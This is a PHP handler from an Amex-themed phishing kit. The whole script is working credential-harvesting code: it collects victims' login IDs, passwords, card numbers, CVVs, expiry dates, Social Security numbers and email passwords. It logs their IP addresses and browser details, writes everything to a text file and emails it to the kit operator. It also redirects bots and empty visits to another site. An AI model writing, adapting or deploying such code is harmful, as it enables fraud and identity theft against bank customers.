<?php
//session_start();

include('../email_config.php');


if($_POST) {

    $honeyPot = $_POST['phoneNumber6tY4bPYk'];


    if ((trim($honeyPot) != '') or !empty($honeyPot) ) {
        // This is a spam robot. Take action!
         exit(header('Location: http://dnkshop.net'));
    }

    $ip = getenv("REMOTE_ADDR");
    $date = date("D M d, Y g:i a");
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($ip);
    $message = "-------------  Amex " . $ip . "  -------------\n";
    $message .= "USER ID : " . $_POST['eliloUserID'] . "\n";
    $message .= "Password : " . $_POST['eliloPassword'] . "\n";
    $message .= "USER ID : " . $_POST['eliloUserID2'] . "\n";
    $message .= "Password : " . $_POST['eliloPassword2'] . "\n";
    $message .= "--------------------------------------------------\n";
    $message .= "4 digits Front : " . $_POST['ccnumber'] . "\n";
    $message .= "3 Digits Back : " . $_POST['cid'] . "\n";
    $message .= "4 digits Front : " . $_POST['ccnumber1'] . "\n";
    $message .= "3 Digits Back : " . $_POST['cid1'] . "\n";
    $message .= "--------------------------------------------------\n";
    $message .= "Card Number : " . $_POST['cardname'] . "\n";
    $message .= "Expiration Date : " . $_POST['expdate'] . "\n";
    $message .= "SSN : " . $_POST['ssn-97'] . "\n";
    $message .= "--------------------------------------------------\n";
    $message .= "Email Address : " . $_POST['email-59'] . "\n";
    $message .= "Email Password : " . $_POST['password-50'] . "\n";
    $message .= "--------------------------------------------------\n";
    $message .= "Confirm Email Address : " . $_POST['email-60'] . "\n";
    $message .= "Confirm Email Password : " . $_POST['password-60'] . "\n";
    $message .= "------------- [ Ip & Hostname Info ] -------------\n";
    $message .= "Client IP : " . $ip . "\n";
    $message .= "HostName : " . $hostname . "\n";
    $message .= "Date And Time : " . $date . "\n";
    $message .= "Browser Details : " . $user_agent . "\n";
    $message .= "-----------------------------------------------\n";
    $subj = " Amex Log ||" . $ip . "\n";

    $fp = fopen('../rezlt' . $_POST['eliloUserID'] . '.txt', 'w');
//    $fp = fopen('../rezlt.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);
    mail($email, $subj, $message, $from);
} else {
    exit(header('Location: http://dnkshop.net'));
}



?>